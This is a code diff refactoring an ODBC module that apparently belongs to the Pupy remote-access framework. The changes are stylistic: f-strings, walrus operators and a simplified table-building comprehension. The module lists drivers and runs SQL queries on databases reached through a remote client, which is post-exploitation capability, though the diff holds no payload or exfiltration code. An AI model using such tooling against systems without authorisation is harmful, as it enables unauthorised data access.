@@ -188,7 +188,7 @@ class ODBC(PupyModule):
         connstring = ' '.join(args.connstring)
         alias = bind(args.alias, connstring, args.encoding)
 
-        self.success('Bind: {} -> {}'.format(alias, connstring))
+        self.success(f'Bind: {alias} -> {connstring}')
 
     def drivers(self, args):
         drivers = self.client.remote('odbc', 'drivers')
@@ -207,22 +207,21 @@ class ODBC(PupyModule):
         unbind = self.client.remote('odbc', 'unbind')
         alias = unbind(args.alias)
 
-        self.success('Unbind: {}'.format(alias))
+        self.success(f'Unbind: {alias}')
 
     def bounded(self, args):
         bounded = self.client.remote('odbc', 'bounded')
-        aliased = bounded()
-        if not aliased:
+        if aliased := bounded():
+            self.log(
+                Table([
+                    {
+                        'ALIAS': alias,
+                        'CONNSTR': connstr
+                    } for (alias, connstr) in aliased
+                ], ['ALIAS', 'CONNSTR'])
+            )
+        else:
             return
-
-        self.log(
-            Table([
-                {
-                    'ALIAS': alias,
-                    'CONNSTR': connstr
-                } for (alias, connstr) in aliased
-            ], ['ALIAS', 'CONNSTR'])
-        )
 
     def describe(self, args):
         describe = self.client.remote('odbc', 'describe')
@@ -274,12 +273,10 @@ class ODBC(PupyModule):
 
         query = 'SELECT count(*) FROM ' + ' '.join(args.query)
 
-        self.info('QUERY: {}'.format(query))
+        self.info(f'QUERY: {query}')
 
-        result = one(args.alias, query)
-
-        if result:
-            self.success('Count: {}'.format(result))
+        if result := one(args.alias, query):
+            self.success(f'Count: {result}')
 
     def query(self, args):
         if not args.query:
@@ -353,14 +350,9 @@ class ODBC(PupyModule):
                 total.inc(len(payload))
 
                 self.log(
-                    Table([
-                        {
-                            title: value
-                            for title, value in zip(
-                                titles, values
-                            )
-                        } for values in payload
-                    ], titles)
+                    Table(
+                        [dict(zip(titles, values)) for values in payload], titles
+                    )
                 )
             else:
                 total.inc(len(payload))
